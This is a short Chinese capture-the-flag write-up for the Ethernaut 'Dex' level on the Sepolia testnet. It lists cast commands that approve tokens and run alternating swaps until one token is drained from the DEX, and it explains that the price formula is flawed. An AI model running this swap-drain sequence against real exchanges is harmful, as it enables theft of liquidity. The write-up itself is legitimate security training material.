# 23-Dex
```
# 1. 查看初始状态
export TOKEN1=0xb04a01b9cf19192d393a85300bbcba0b126a18ab
export TOKEN2=0x21d1be3af432384865df27b8efbe15473b9325e2
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $Dex_ADDRESS --rpc-url $sepolia_rpc
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN2 $Dex_ADDRESS --rpc-url $sepolia_rpc
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $YOUR_ADDRESS --rpc-url $sepolia_rpc
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN2 $YOUR_ADDRESS --rpc-url $sepolia_rpc
====>
0x0000000000000000000000000000000000000000000000000000000000000064
0x0000000000000000000000000000000000000000000000000000000000000064
0x000000000000000000000000000000000000000000000000000000000000000a  
0x000000000000000000000000000000000000000000000000000000000000000a

# 2. 授权 //用户授权dex合约使用最大数量的token1和token2
cast send $Dex_ADDRESS "approve(address,uint256)" $Dex_ADDRESS $(cast max-uint) \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 3. Round 1: token1 → token2
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 10 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 4. Round 2: token2 → token1
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 20 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 5. Round 3: token1 → token2
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 24 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 30 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN1 $TOKEN2 41 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
cast send $Dex_ADDRESS "swap(address,address,uint256)" $TOKEN2 $TOKEN1 45 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
====>token1被全部兑换出来
cast call $Dex_ADDRESS "balanceOf(address,address)" $TOKEN1 $Dex_ADDRESS --rpc-url $sepolia_rpc
0x0000000000000000000000000000000000000000000000000000000000000000
```

### 考察点
- 价格计算公式本身有缺陷,可以通过反复交易套利